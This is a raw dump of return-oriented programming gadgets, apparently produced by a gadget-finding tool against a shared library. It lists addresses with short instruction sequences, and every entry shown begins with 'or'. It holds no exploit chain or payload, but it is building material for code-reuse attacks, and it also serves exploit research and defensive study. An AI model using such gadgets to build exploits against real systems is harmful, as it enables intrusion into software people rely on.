0x00002aaaaac0f8bb : or byte ptr [rcx + rcx*4 + 0x44], cl ; and al, 8 ; lea rsi, qword ptr [rsp + 0x18] ; call qword ptr [rax]
0x00002aaaaac05ac3 : or byte ptr [rcx + rcx*4 + 0xc], cl ; and al, 0xe8 ; ret
0x00002aaaaabf436c : or byte ptr [rcx + rcx*4 - 0x11], cl ; call r12
0x00002aaaaac03921 : or byte ptr [rcx + rcx*4 - 0x16], cl ; mov rsi, r12 ; mov rdi, rbp ; call rax
0x00002aaaaab5143b : or byte ptr [rcx + rcx*4 - 0x18], al ; pop rbx ; pop rbp ; pop r12 ; pop r13 ; ret
0x00002aaaaab432b3 : or byte ptr [rcx + rcx*4 - 0x18], cl ; pop rbx ; pop rbp ; pop r12 ; pop r13 ; ret
0x00002aaaaac0f9fd : or byte ptr [rcx + rcx*4 - 0x19], cl ; call qword ptr [rax]
0x00002aaaaab0cd67 : or byte ptr [rcx + rcx*4 - 0x1a], cl ; mov rdi, rbp ; call r15
0x00002aaaaab634ea : or byte ptr [rcx + rcx*4 - 0x20], cl ; pop rbx ; pop rbp ; pop r12 ; pop r13 ; ret
0x00002aaaaab0c8af : or byte ptr [rcx + rcx*4 - 0xa], cl ; mov rdi, r13 ; mov rdx, rbp ; call r15
0x00002aaaaab0e1a7 : or byte ptr [rcx + rcx*4 - 2], cl ; mov rdi, r13 ; call r14
0x00002aaaaac7d4e8 : or byte ptr [rcx + rsi*8], bl ; jmp qword ptr [rcx]
0x00002aaaaab1d432 : or byte ptr [rcx - 0x2feeb728], cl ; pop rbp ; pop rbx ; ret
0x00002aaaaab4c63a : or byte ptr [rcx - 0x74b777bb], cl ; or cl, byte ptr [rax - 0x7d] ; ret
0x00002aaaaabaea3c : or byte ptr [rcx - 0x75], al ; or cl, al ; jmp 0xffffffffc296db59
0x00002aaaaabaeb3f : or byte ptr [rcx - 0x75], al ; or r9b, al ; out dx, al ; or byte ptr [rcx - 0x77], al ; ret 0xff25
0x00002aaaaabab30c : or byte ptr [rcx - 0x75], cl ; je 0xd633c ; or byte ptr [rcx], ch ; ret
0x00002aaaaab7700f : or byte ptr [rcx - 0x76b7f7be], cl ; clc ; ret
0x00002aaaaabaea43 : or byte ptr [rcx - 0x77], al ; ret 0xff25
0x00002aaaaab47510 : or byte ptr [rcx - 0x77], cl ; ret
0x00002aaaaab11e6f : or byte ptr [rcx - 0x77], cl ; ret 0x44c6
0x00002aaaaabde888 : or byte ptr [rcx - 0x7c172c07], cl ; loopne 0x10989a ; ret
0x00002aaaaabde918 : or byte ptr [rcx - 0x7c172c07], cl ; loopne 0x10992a ; ret
0x00002aaaaabde9b8 : or byte ptr [rcx - 0x7c172c07], cl ; loopne 0x1099ca ; ret
0x00002aaaaabdea48 : or byte ptr [rcx - 0x7c172c07], cl ; loopne 0x109a5a ; ret
0x00002aaaaabdead8 : or byte ptr [rcx - 0x7c172c07], cl ; loopne 0x109aea ; ret
0x00002aaaaabdeb68 : or byte ptr [rcx - 0x7c172c07], cl ; loopne 0x109b7a ; ret
0x00002aaaaabdec08 : or byte ptr [rcx - 0x7c172c07], cl ; loopne 0x109c1a ; ret
0x00002aaaaabdeca8 : or byte ptr [rcx - 0x7c172c07], cl ; loopne 0x109cba ; ret
0x00002aaaaabded48 : or byte ptr [rcx - 0x7c172c07], cl ; loopne 0x109d5a ; ret
0x00002aaaaabdedd8 : or byte ptr [rcx - 0x7c172c07], cl ; loopne 0x109dea ; ret
0x00002aaaaabdee73 : or byte ptr [rcx - 0x7c172c07], cl ; loopne 0x109e85 ; ret
0x00002aaaaabdef08 : or byte ptr [rcx - 0x7c172c07], cl ; loopne 0x109f1a ; ret
0x00002aaaaabdf22a : or byte ptr [rcx - 0x7c172c07], cl ; loopne 0x10a23c ; ret
0x00002aaaaabdf2aa : or byte ptr [rcx - 0x7c172c07], cl ; loopne 0x10a2bc ; ret
0x00002aaaaabdf32a : or byte ptr [rcx - 0x7c172c07], cl ; loopne 0x10a33c ; ret
0x00002aaaaabdf3aa : or byte ptr [rcx - 0x7c172c07], cl ; loopne 0x10a3bc ; ret
0x00002aaaaabdf42a : or byte ptr [rcx - 0x7c172c07], cl ; loopne 0x10a43c ; ret
0x00002aaaaabdf4aa : or byte ptr [rcx - 0x7c172c07], cl ; loopne 0x10a4bc ; ret
0x00002aaaaabdf52a : or byte ptr [rcx - 0x7c172c07], cl ; loopne 0x10a53c ; ret
0x00002aaaaabdf5aa : or byte ptr [rcx - 0x7c172c07], cl ; loopne 0x10a5bc ; ret
0x00002aaaaabdf62a : or byte ptr [rcx - 0x7c172c07], cl ; loopne 0x10a63c ; ret
0x00002aaaaabdf6aa : or byte ptr [rcx - 0x7c172c07], cl ; loopne 0x10a6bc ; ret
0x00002aaaaabdf727 : or byte ptr [rcx - 0x7c172c07], cl ; loopne 0x10a739 ; ret
0x00002aaaaabdf7aa : or byte ptr [rcx - 0x7c172c07], cl ; loopne 0x10a7bc ; ret
0x00002aaaaab1d4c2 : or byte ptr [rcx - 0x7d], cl ; clc ; push qword ptr [rbp - 0x19] ; mov rax, rdx ; ret
0x00002aaaaab57f79 : or byte ptr [rcx - 0x7d], cl ; jmp qword ptr [rax]
0x00002aaaaab0e09a : or byte ptr [rcx - 0x7d], cl ; ret
0x00002aaaaabb80f8 : or byte ptr [rcx - 0x7d], cl ; ret 0x4501
0x00002aaaaab0c611 : or byte ptr [rcx - 0x7d], cl ; ret 0xf301
0x00002aaaaabbd02a : or byte ptr [rcx - 0x9ce8c28], cl ; ret
0x00002aaaaabcac22 : or byte ptr [rcx], al ; add byte ptr [rax], al ; mov dword ptr [rsi], eax ; xor eax, eax ; ret
0x00002aaaaab0a9df : or byte ptr [rcx], al ; add byte ptr [rax], al ; ret
0x00002aaaaabcad14 : or byte ptr [rcx], al ; add byte ptr [rax], al ; xor eax, eax ; ret
0x00002aaaaac6c6c5 : or byte ptr [rcx], al ; add byte ptr [rbx + rdi*8], dh ; out dx, eax ; call rsp
0x00002aaaaaba9d7e : or byte ptr [rcx], al ; mov byte ptr [rdi], 0x5b ; mov eax, 1 ; ret
0x00002aaaaaba9dd7 : or byte ptr [rcx], al ; mov byte ptr [rdi], al ; mov eax, 1 ; ret
0x00002aaaaaba9d52 : or byte ptr [rcx], al ; mov eax, 1 ; ret
0x00002aaaaab8f66f : or byte ptr [rcx], bh ; push rdi ; or byte ptr [rbp - 0x28], dh ; ret
0x00002aaaaac13823 : or byte ptr [rcx], bh ; ret 0x3875
0x00002aaaaac76ec8 : or byte ptr [rcx], bl ; in eax, dx ; jmp qword ptr [rax]
0x00002aaaaaba9d92 : or byte ptr [rcx], bl ; mov eax, 1 ; ret
0x00002aaaaab8e33d : or byte ptr [rcx], ch ; ret
0x00002aaaaabf991c : or byte ptr [rcx], cl ; ret 0xb60f
0x00002aaaaabe9e50 : or byte ptr [rcx], dh ; rcr byte ptr [rbx + 0x41], 0x5c ; pop r13 ; pop rbp ; ret
0x00002aaaaaaf7b4e : or byte ptr [rcx], dh ; rcr byte ptr [rbx + 0x5d], 0x41 ; pop rsp ; pop r13 ; ret
0x00002aaaaabbbfdb : or byte ptr [rcx], dh ; rcr byte ptr [rbx + 0x5d], 0x41 ; pop rsp ; ret
0x00002aaaaab52b6b : or byte ptr [rcx], dh ; ror byte ptr [rax - 0x77], cl ; rcr byte ptr [rbx + 0x5d], 1 ; ret
0x00002aaaaab518cf : or byte ptr [rcx], dh ; ror byte ptr [rax - 0x7d], 0xc4 ; or byte ptr [rbx + 0x5d], bl ; ret
0x00002aaaaac59e9e : or byte ptr [rdi + 0x26], al ; and dword ptr cs:[rax], edx ; jmp qword ptr [rdi]
0x00002aaaaac783f3 : or byte ptr [rdi + 0xb], al ; add dh, byte ptr [rbp + 0x41180e0a] ; ret
0x00002aaaaac76a74 : or byte ptr [rdi + 0xb], al ; jae 0x1a1a88 ; ret
0x00002aaaaac746f9 : or byte ptr [rdi + 0xe], al ; adc byte ptr [rbx + 0xaae0202], al ; ret
0x00002aaaaac84e28 : or byte ptr [rdi - 0xb], ch ; jmp qword ptr [rcx]
0x00002aaaaab43534 : or byte ptr [rdi], 0x84 ; mov ch, 0 ; add byte ptr [rax], al ; mov rax, rdx ; pop rbx ; ret
0x00002aaaaaafbec3 : or byte ptr [rdi], 0x94 ; ret 0x8348
0x00002aaaaaaff219 : or byte ptr [rdi], cl ; mov bh, 0x43 ; add al, 0x29 ; ret 0x8941
0x00002aaaaab02d14 : or byte ptr [rdi], cl ; mov bh, 0xc0 ; ret
0x00002aaaaab4f60c : or byte ptr [rdi], cl ; mov dh, 0 ; add rsp, 8 ; pop rbx ; pop rbp ; ret
0x00002aaaaab5042c : or byte ptr [rdi], cl ; mov dh, 0 ; pop rbx ; ret
0x00002aaaaab4cf61 : or byte ptr [rdi], cl ; mov dh, 0 ; ret
0x00002aaaaaba36b3 : or byte ptr [rdi], cl ; mov dh, 0x42 ; add cl, byte ptr [rax - 0x7d] ; ret 0x8301
0x00002aaaaab41851 : or byte ptr [rdi], cl ; mov dh, 0x42 ; add dword ptr [rcx - 0x77], eax ; ret 0xe883
0x00002aaaaab4cfcb : or byte ptr [rdi], cl ; mov dh, 0xc0 ; neg eax ; ret
0x00002aaaaac039f9 : or byte ptr [rdi], cl ; mov dh, 0xc0 ; pop rbx ; pop rbp ; ret
0x00002aaaaab1a3b8 : or byte ptr [rdi], cl ; mov dh, 0xc0 ; ret
0x00002aaaaab0ad64 : or byte ptr [rdi], cl ; ret 0xc289
0x00002aaaaac259fb : or byte ptr [rdi], cl ; sub dword ptr [rdi], esp ; jmp r9
0x00002aaaaab1c53f : or byte ptr [rdi], cl ; xchg eax, ebp ; ret 0xc221
0x00002aaaaabbeddc : or byte ptr [rdi], cl ; xchg eax, ebp ; ror byte ptr [rdi], 0xb6 ; sal bh, 0xd8 ; ret
0x00002aaaaabdde14 : or byte ptr [rdi], cl ; xchg eax, edi ; ror byte ptr [rdi], 0xb6 ; sal bh, 0xd8 ; ret
0x00002aaaaab2138e : or byte ptr [rdi], cl ; xchg eax, esp ; ret 0x9522
0x00002aaaaaaf586a : or byte ptr [rdi], cl ; xchg eax, esp ; ret 0xd284
0x00002aaaaac71fa2 : or byte ptr [rdx + 0xb], cl ; pop rdi ; ret
0x00002aaaaab80c6e : or byte ptr [rdx + rdx + 0x3b], dh ; ja 0xabc86 ; cmove rax, rcx ; ret
0x00002aaaaac882f8 : or byte ptr [rdx - 0xa], dl ; call qword ptr [rax]
0x00002aaaaab44f7d : or byte ptr [rdx - 1], bh ; mov eax, edx ; pop rbx ; pop rbp ; ret
0x00002aaaaac8be98 : or byte ptr [rdx - 9], ch ; jmp rsi
0x00002aaaaac9076d : or byte ptr [rdx], al ; add byte ptr [rax], al ; jp 0x1bb771 ; call qword ptr [rcx]
0x00002aaaaabac0c7 : or byte ptr [rdx], al ; jne 0xd70a5 ; jmp 0xd7095
0x00002aaaaaba9d32 : or byte ptr [rdx], al ; xor eax, eax ; ret
0x00002aaaaaba9db9 : or byte ptr [rdx], bl ; mov eax, 2 ; ret
0x00002aaaaac008b9 : or byte ptr [rdx], ch ; push 0x19 ; call qword ptr [rax]
0x00002aaaaabd0722 : or byte ptr [rip + 0x100f], ah ; ret
0x00002aaaaabd0721 : or byte ptr [rip + 0x100f], r12b ; ret
0x00002aaaaac6980c : or byte ptr [rip + 0x10fffc], 0xfc ; call rax
0x00002aaaaabd0a0a : or byte ptr [rip - 0x80000000], 0x39 ; ret 0x8e75
0x00002aaaaab79bc1 : or byte ptr [rsi + 0xf], ah ; adc ecx, dword ptr [rdx + 8] ; mov rax, rdi ; ret
0x00002aaaaabe3b8b : or byte ptr [rsi + rbx + 0x4c], dh ; mov edx, eax ; jmp 0x10eba1
0x00002aaaaabab751 : or byte ptr [rsi + rdx*4 + 0x5b], dh ; ret
0x00002aaaaab76fd0 : or byte ptr [rsi - 0x77], ah ; or byte ptr [rax - 0x77], cl ; clc ; ret
0x00002aaaaaba9def : or byte ptr [rsi], bl ; mov eax, 2 ; ret
0x00002aaaaabc1ff0 : or byte ptr [rsi], cl ; add byte ptr [rax], al ; add cl, ch ; ret
0x00002aaaaaba9d23 : or byte ptr [rsi], dl ; mov eax, 1 ; ret
0x00002aaaaac698ac : or byte ptr [rsp + rdi*8], 0xff ; adc bh, bh ; sti ; call rax
0x00002aaaaaad8cde : or byte ptr fs:[rbx + 0x4e], ch ; ret 0x6bba
0x00002aaaaac73640 : or ch, 0xe9 ; call qword ptr [rdx]
0x00002aaaaab31462 : or ch, 4 ; cmp r12b, 0x49 ; cmove esi, ecx ; jmp 0x5c43b
0x00002aaaaab4a8b2 : or ch, ah ; or dword ptr [rax], eax ; add rsp, 0x80 ; ret
0x00002aaaaab6af41 : or ch, bl ; ret 0x1f0f
0x00002aaaaac909e8 : or ch, byte ptr [rdi + 5] ; ret
0x00002aaaaac90acb : or ch, byte ptr [rsi] ; ret 0xb
0x00002aaaaab1c63f : or cl, al ; call 0xffffffffc28db76b
0x00002aaaaabaea40 : or cl, al ; jmp 0xffffffffc296db55
0x00002aaaaabaea3f : or cl, al ; jmp 0xffffffffc296db56
0x00002aaaaabaeb43 : or cl, al ; out dx, al ; or byte ptr [rcx - 0x77], al ; ret 0xff25
0x00002aaaaab0a05b : or cl, bl ; std ; fstp st(1) ; ret
0x00002aaaaab8f717 : or cl, byte ptr [rax + 0x29] ; ret 0x8941
0x00002aaaaaafed94 : or cl, byte ptr [rax + 0x39] ; ret 0x4676
0x00002aaaaab805b5 : or cl, byte ptr [rax + 0x39] ; ret 0xe575
0x00002aaaaab4f5fe : or cl, byte ptr [rax + 1] ; ret 0x8948
0x00002aaaaab4dbd7 : or cl, byte ptr [rax + 1] ; ret 0x8949
0x00002aaaaab3b2cb : or cl, byte ptr [rax + rax] ; add byte ptr [rcx - 0x77], cl ; ret
0x00002aaaaab7aaf1 : or cl, byte ptr [rax - 0x73] ; jg 0xa5b0b ; jne 0xa628b ; ret
0x00002aaaaab7c195 : or cl, byte ptr [rax - 0x73] ; jg 0xa71af ; jne 0xa7a9b ; ret
0x00002aaaaac3cfe2 : or cl, byte ptr [rax - 0x73] ; or cl, byte ptr [rdi] ; test dword ptr [rbx + 2], eax ; add byte ptr [rax], al ; ret
0x00002aaaaab47faf : or cl, byte ptr [rax - 0x77] ; ret
0x00002aaaaabbc866 : or cl, byte ptr [rax - 0x77] ; ret 0xa1e8
0x00002aaaaab95a12 : or cl, byte ptr [rax - 0x77] ; ror dword ptr [rax - 0x7d], cl ; ret 0xf601
0x00002aaaaab4475c : or cl, byte ptr [rax - 0x7d] ; ret
0x00002aaaaab620ba : or cl, byte ptr [rax - 0x7d] ; ret 0x4801
0x00002aaaaabadc2f : or cl, byte ptr [rax - 0x7d] ; ret 0x8304
0x00002aaaaab1fc1a : or cl, byte ptr [rax - 0x7d] ; ret 0x8d04
0x00002aaaaab1245d : or cl, byte ptr [rbp - 0x57f2faf] ; or cl, byte ptr [rdi] ; xchg eax, edx ; ret 0xb60f
0x00002aaaaab46f87 : or cl, byte ptr [rbx + 0x5bd08910] ; ret
0x00002aaaaabed845 : or cl, byte ptr [rcx + 0x18e8c1f8] ; ret
0x00002aaaaaaf4963 : or cl, byte ptr [rcx + 0x1c829f0] ; sar dword ptr [rcx], 1 ; ret 0xffb8
0x00002aaaaac1246f : or cl, byte ptr [rcx + 0x39] ; ret
0x00002aaaaac17eec : or cl, byte ptr [rcx + rcx*4 - 0x16] ; add r9, qword ptr [rbp - 0x88] ; call rax
0x00002aaaaabe2ad2 : or cl, byte ptr [rcx - 0x77] ; fmul qword ptr [rcx + 0x29] ; fisttp word ptr [rax - 0x77] ; ret
0x00002aaaaabed7c5 : or cl, byte ptr [rcx - 0xda08] ; inc dword ptr [rax] ; ret
0x00002aaaaac3cfe6 : or cl, byte ptr [rdi] ; test dword ptr [rbx + 2], eax ; add byte ptr [rax], al ; ret
0x00002aaaaab5a7da : or cl, byte ptr [rdi] ; xchg dword ptr [rcx + rax - 0x7cb70000], ebx ; ret 0xe96e
0x00002aaaaab12323 : or cl, byte ptr [rdi] ; xchg eax, edx ; ret 0xb60f
0x00002aaaaac120f1 : or cl, byte ptr [rdi] ; xchg eax, esp ; ret
0x00002aaaaab0a6f7 : or cl, ch ; ret
0x00002aaaaabb9b40 : or cl, ch ; ret 0xfffe
0x00002aaaaaad7beb : or cl, cl ; clc ; ret
0x00002aaaaab61c05 : or cl, cl ; cmove rax, rdx ; ret
0x00002aaaaac2f983 : or dh, bl ; movq qword ptr [rdi], mm1 ; ret
0x00002aaaaabd9ad5 : or dh, bl ; ret
0x00002aaaaab499af : or dh, byte ptr [rax + rdi*4 + 0x48] ; add esp, 8 ; mov eax, ebp ; pop rbx ; pop rbp ; ret
0x00002aaaaab7f266 : or dh, byte ptr [rbp - 0x11] ; ret
0x00002aaaaab47d56 : or dh, byte ptr [rdi + rcx + 0x48] ; cmp esi, ecx ; jb 0x72d5b ; lea eax, dword ptr [rdx + rdi] ; ret
0x00002aaaaab51006 : or dh, byte ptr [rdi + rcx + 0x48] ; cmp esi, ecx ; jne 0x7c00b ; lea eax, dword ptr [rdx + rdi] ; ret
0x00002aaaaab4f789 : or dh, byte ptr [rsp + rdi*2 + 0x40] ; movzx eax, ch ; pop rbx ; pop rbp ; pop r12 ; ret
0x00002aaaaac6d651 : or dh, dh ; inc esp ; jne 0x198662 ; add byte ptr [rdx + rcx - 0xa], ah ; jmp rsp
0x00002aaaaac6d659 : or dh, dh ; jmp rsp
0x00002aaaaab565d3 : or dh, dh ; ret 0x7404
0x00002aaaaabcb613 : or dh, dh ; ret 0x7540
0x00002aaaaac02294 : or dh, dh ; ret 0x8802
0x00002aaaaab56546 : or dh, dh ; ret 0xf04
0x00002aaaaaaf4e58 : or dh, dh ; ret 0xf08
0x00002aaaaab043de : or dh, dh ; ret 0xfdf
0x00002aaaaac7ede1 : or dh, dl ; call rsi
0x00002aaaaac698c8 : or dil, spl ; inc dword ptr [rax + 0xc] ; cld ; call rax
0x00002aaaaac8a8a8 : or dl, ah ; sti ; call rsi
0x00002aaaaac811d8 : or dl, bl ; jmp qword ptr [rcx]
0x00002aaaaac5bdf0 : or dl, bl ; out dx, eax ; jmp qword ptr [rax]
0x00002aaaaab69ba2 : or dl, byte ptr [rcx - 0x76b70001] ; ret 0xc031
0x00002aaaaac5d4bc : or dl, ch ; call qword ptr [rdi]
0x00002aaaaac5d4d4 : or dl, ch ; jmp qword ptr [rdi]
0x00002aaaaab73078 : or dl, cl ; jne 0x9e06a ; cmp r8d, ecx ; je 0x9e06a ; ret
0x00002aaaaab3b56e : or dword ptr [eax], eax ; add byte ptr [rcx - 0x77], cl ; ret
0x00002aaaaac28e64 : or dword ptr [rax + rax], eax ; movsxd rdx, dword ptr [r11 + rdx*4] ; lea rdx, qword ptr [r11 + rdx] ; jmp rdx
0x00002aaaaabf42c0 : or dword ptr [rax - 0x73], ecx ; cmp eax, 0x2a83d8 ; call rax
0x00002aaaaab7aacc : or dword ptr [rax - 0x73], ecx ; jg 0xa5ae5 ; jne 0xa628b ; ret
0x00002aaaaab7c170 : or dword ptr [rax - 0x73], ecx ; jg 0xa7189 ; jne 0xa7a9b ; ret
0x00002aaaaac066a3 : or dword ptr [rax - 0x73], ecx ; mov ebx, 0xc8 ; call rax
0x00002aaaaac3cfc2 : or dword ptr [rax - 0x73], ecx ; or qword ptr [rdi], rcx ; test dword ptr [rbx + 2], esp ; add byte ptr [rax], al ; ret
0x00002aaaaabe2c09 : or dword ptr [rax - 0x7d], ecx ; call 0xffffffffc34a2419
0x00002aaaaab6d76b : or dword ptr [rax - 0x7d], ecx ; ret 0x4801
0x00002aaaaab5debe : or dword ptr [rax - 1], ecx ; ret 0xc148
0x00002aaaaaaf5580 : or dword ptr [rax], eax ; add bl, dh ; ret
0x00002aaaaac194ed : or dword ptr [rax], eax ; add byte ptr [rax - 0x7d], cl ; ret 0x4910
0x00002aaaaac1f9df : or dword ptr [rax], eax ; add byte ptr [rax - 0x7d], cl ; ret 0xe910
0x00002aaaaac19447 : or dword ptr [rax], eax ; add byte ptr [rax - 0x7d], cl ; ret 0xeb10
0x00002aaaaab40b53 : or dword ptr [rax], eax ; add byte ptr [rax], al ; add rsp, 0xd8 ; ret
0x00002aaaaabca043 : or dword ptr [rax], eax ; add byte ptr [rax], al ; add rsp, 8 ; pop rbx ; pop rbp ; ret
0x00002aaaaab08f0a : or dword ptr [rax], eax ; add byte ptr [rax], al ; mov eax, 0xffffffff ; pop rbx ; ret
0x00002aaaaab48c9f : or dword ptr [rax], eax ; add byte ptr [rax], al ; mov eax, 0xffffffff ; ret
0x00002aaaaaaf622a : or dword ptr [rax], eax ; add byte ptr [rax], al ; mov eax, edi ; ret
0x00002aaaaabca188 : or dword ptr [rax], eax ; add byte ptr [rax], al ; pop rbx ; pop rbp ; pop r12 ; ret
0x00002aaaaab3b56f : or dword ptr [rax], eax ; add byte ptr [rcx - 0x77], cl ; ret
0x00002aaaaab79115 : or dword ptr [rax], eax ; add cl, ch ; ret
0x00002aaaaab4a99d : or dword ptr [rax], eax ; add rsp, 0x80 ; mov eax, edx ; ret
0x00002aaaaab4b648 : or dword ptr [rax], eax ; add rsp, 0x80 ; pop rbx ; ret
0x00002aaaaab4a8b4 : or dword ptr [rax], eax ; add rsp, 0x80 ; ret
0x00002aaaaabc6553 : or dword ptr [rax], eax ; movsxd rax, dword ptr [rdx + rax*4] ; add rdx, rax ; jmp rdx
0x00002aaaaabc727a : or dword ptr [rax], eax ; movsxd rcx, dword ptr [rdx + rcx*4] ; add rdx, rcx ; jmp rdx
0x00002aaaaabc6a47 : or dword ptr [rax], eax ; movsxd rdx, dword ptr [rax + rdx*4] ; add rax, rdx ; jmp rax
0x00002aaaaab80f4f : or dword ptr [rax], eax ; movzx esi, bl ; mov rdi, qword ptr [rbp] ; call r12
0x00002aaaaac90b1e : or dword ptr [rax], ebx ; add byte ptr [rax], al ; loopne 0x1bbb34 ; ret 0xa
0x00002aaaaab1243d : or dword ptr [rbp - 0x57f2faf], ecx ; or cl, byte ptr [rdi] ; xchg eax, edx ; ret 0xb60f
0x00002aaaaac5d74c : or dword ptr [rbp - 0xc], edx ; call qword ptr [rbx]
0x00002aaaaac43c96 : or dword ptr [rbp - 0xcffffff], 0xf ; outsd dx, dword ptr [rsi] ; push rdi ; ret 0xff3
0x00002aaaaac025b6 : or dword ptr [rbx + 0x31], ebx ; rcr byte ptr [rbp + 0x41], 0x5c ; ret
0x00002aaaaabe24b6 : or dword ptr [rbx + 0x5d], ebx ; pop r12 ; pop r13 ; pop r14 ; ret
0x00002aaaaabc315b : or dword ptr [rbx - 0x7af0f508], eax ; ret 0xa
0x00002aaaaac5d684 : or dword ptr [rbx - 0xc], edx ; call qword ptr [rbx]
0x00002aaaaab42de3 : or dword ptr [rbx], 0x20 ; add rsp, 8 ; pop rbx ; pop rbp ; ret
0x00002aaaaab4d9d0 : or dword ptr [rbx], 0x20 ; mov eax, 0xffffffff ; pop rbx ; ret
0x00002aaaaab520a8 : or dword ptr [rbx], 8 ; pop rbx ; ret
0x00002aaaaabe7483 : or dword ptr [rbx], ebp ; add byte ptr [rax + 0x63], cl ; ret 0x4864
0x00002aaaaab1d8bc : or dword ptr [rcx + 0x39], ecx ; ret 0x870f
0x00002aaaaab5f818 : or dword ptr [rcx + 0xf], eax ; xchg eax, esi ; ret 0xc031
0x00002aaaaab45fee : or dword ptr [rcx + rcx*4 - 0x40], eax ; pop rbx ; ret
0x00002aaaaab5a7a6 : or dword ptr [rcx - 0x7d], ecx ; cli ; adc al, 0x77 ; and ecx, dword ptr [rcx - 0x7d] ; ret 0xeb5b
0x00002aaaaab6a094 : or dword ptr [rcx - 0x7d], ecx ; ret
0x00002aaaaaba9740 : or dword ptr [rcx - 0x7d], ecx ; ret 0x4c01
0x00002aaaaab5a989 : or dword ptr [rcx - 0x7d], ecx ; ret 0xe977
0x00002aaaaabc6a46 : or dword ptr [rcx], 0x14634800 ; nop ; add rax, rdx ; jmp rax
0x00002aaaaac17b46 : or dword ptr [rcx], esi ; ror byte ptr [rax - 0x7d], 0xc4 ; ret
0x00002aaaaab91bab : or dword ptr [rdi + 0x1490030], ecx ; ret
0x00002aaaaab0af43 : or dword ptr [rdi + rax*8], edx ; xor eax, eax ; ret
0x00002aaaaab59991 : or dword ptr [rdi - 0x70], esi ; movsxd rax, dword ptr [r13 + rax*4] ; add rax, r13 ; jmp rax
0x00002aaaaab42df0 : or dword ptr [rdi], 0x20 ; ret
0x00002aaaaabd07d7 : or dword ptr [rdi], 0x80000000 ; xor eax, eax ; ret
0x00002aaaaab0b086 : or dword ptr [rdi], eax ; xor eax, eax ; ret
0x00002aaaaabf13fb : or dword ptr [rdi], ecx ; ret
0x00002aaaaac3cfc6 : or dword ptr [rdi], ecx ; test dword ptr [rbx + 2], esp ; add byte ptr [rax], al ; ret
0x00002aaaaab5f7c2 : or dword ptr [rdi], ecx ; xchg eax, esi ; ret 0xc031
0x00002aaaaabd5f3a : or dword ptr [rdi], ecx ; xchg edi, ebp ; add byte ptr [rax], al ; add byte ptr [rax - 0x7d], cl ; ret
0x00002aaaaabd64ba : or dword ptr [rdi], ecx ; xchg edi, esp ; add byte ptr [rax], al ; add byte ptr [rax - 0x7d], cl ; ret
0x00002aaaaabfc761 : or dword ptr [rip + 0x2a02fc], 2 ; add rsp, 8 ; ret
0x00002aaaaab2078b : or dword ptr [rsi + rax], 0xf8834800 ; dec dword ptr [rax - 0x77] ; ret
0x00002aaaaac82b8a : or dword ptr [rsi], 0x54028310 ; ret
0x00002aaaaaafb9b0 : or dword ptr [rsi], 0xea810000 ; ret 0
0x00002aaaaac90b23 : or dword ptr [rsi], ebp ; ret 0xa
0x00002aaaaac0b793 : or dword ptr [rsi], esi ; add byte ptr [rax], al ; mov rdi, rbx ; call qword ptr [rax]
0x00002aaaaab5cca2 : or eax, 0x10429e ; mov rdx, rcx ; jmp 0x87c77
0x00002aaaaabd0cfa : or eax, 0x10c48348 ; pop rbx ; pop rbp ; pop r12 ; ret
0x00002aaaaac6980d : or eax, 0x10fffc ; cld ; call rax
0x00002aaaaab097fb : or eax, 0x15ef10 ; orpd xmm0, xmm1 ; ret
0x00002aaaaab7ba71 : or eax, 0x1c478d48 ; ret
0x00002aaaaab7c8c1 : or eax, 0x1d478d48 ; ret
0x00002aaaaac3d048 : or eax, 0x1e1850f ; add byte ptr [rax], al ; ret
0x00002aaaaac6928d : or eax, 0x1e80fffb ; sti ; jmp qword ptr [rax]
0x00002aaaaab0a837 : or eax, 0x24448b00 ; or al, 0x48 ; add esp, 0x10 ; pop rbx ; ret
0x00002aaaaab50c62 : or eax, 0x28c48348 ; pop rbx ; pop rbp ; ret
0x00002aaaaac0b57f : or eax, 0x2919cc ; jne 0x13659b ; jmp 0x1365b5
0x00002aaaaabe0567 : or eax, 0x2bb0cc ; jne 0x10b583 ; jmp 0x10b59d
0x00002aaaaabd3744 : or eax, 0x2c7987 ; mov byte ptr [r8 - 1], 0 ; ret
0x00002aaaaabd0cb1 : or eax, 0x30 ; mov dword ptr [rdi + 8], eax ; ret
0x00002aaaaac697ed : or eax, 0x30fffc ; cld ; push rax ; add esp, edi ; call rax
0x00002aaaaab5a94e : or eax, 0x33e1cd ; jne 0x8596a ; jmp 0x85984
0x00002aaaaac796dc : or eax, 0x380e0a03 ; ret
0x00002aaaaab49f4a : or eax, 0x3b484a8b ; cmove r8, rcx ; ret
0x00002aaaaab41232 : or eax, 0x401f0f08 ; add byte ptr [rax - 0x7d], cl ; ret 0x4801
0x00002aaaaab4195a : or eax, 0x401f0f08 ; add byte ptr [rax - 0x7d], cl ; ret 0x8b04
0x00002aaaaab924b5 : or eax, 0x440f4800 ; ret 0x8d48
0x00002aaaaab1acef : or eax, 0x48000000 ; add esp, 0xd8 ; ret
0x00002aaaaab6abf2 : or eax, 0x48c0bc0f ; lea eax, dword ptr [rdi + rax] ; ret
0x00002aaaaab9426a : or eax, 0x48d08948 ; add esp, 8 ; ret
0x00002aaaaac00f8f : or eax, 0x4c0000de ; lea ecx, dword ptr [rsp + 0x18] ; call qword ptr [rax]
0x00002aaaaabf859a : or eax, 0x4e6c148 ; lea rax, qword ptr [rdi + rsi + 8] ; ret
0x00002aaaaab05418 : or eax, 0x58b4400 ; jae 0xffffffff894b0467 ; ret
0x00002aaaaabd8360 : or eax, 0x5ba ; add byte ptr [rax - 0x77], cl ; fsubp st(0) ; ret 0xffe8
0x00002aaaaabd8260 : or eax, 0x5ba ; add byte ptr [rax - 0x77], cl ; fsubp st(0) ; ret 0xffe9
0x00002aaaaab3fcc2 : or eax, 0x5bd88948 ; ret
0x00002aaaaac0cb02 : or eax, 0x5c415d5b ; ret
0x00002aaaaac289d6 : or eax, 0x63490004 ; adc al, 0x93 ; lea rdx, qword ptr [r11 + rdx] ; jmp rdx
0x00002aaaaab7ab55 : or eax, 0x724850f ; add byte ptr [rax], al ; ret
0x00002aaaaab7a3d8 : or eax, 0x77f0ff3 ; movdqu xmmword ptr [rdi + 0xd], xmm2 ; ret
0x00002aaaaab124b1 : or eax, 0x80d0518d ; cli ; or cl, byte ptr [rdi] ; xchg eax, edx ; ret 0xb60f
0x00002aaaaac1a097 : or eax, 0x83480000 ; ret 0x4910
0x00002aaaaac1bc31 : or eax, 0x83480000 ; ret 0xe910
0x00002aaaaac1a0c5 : or eax, 0x83480000 ; ret 0xeb10
0x00002aaaaab7c209 : or eax, 0x880850f ; add byte ptr [rax], al ; ret
0x00002aaaaab433ba : or eax, 0x8c48348 ; mov eax, edx ; pop rbx ; pop rbp ; ret
0x00002aaaaab61c82 : or eax, 0x8c48348 ; ret
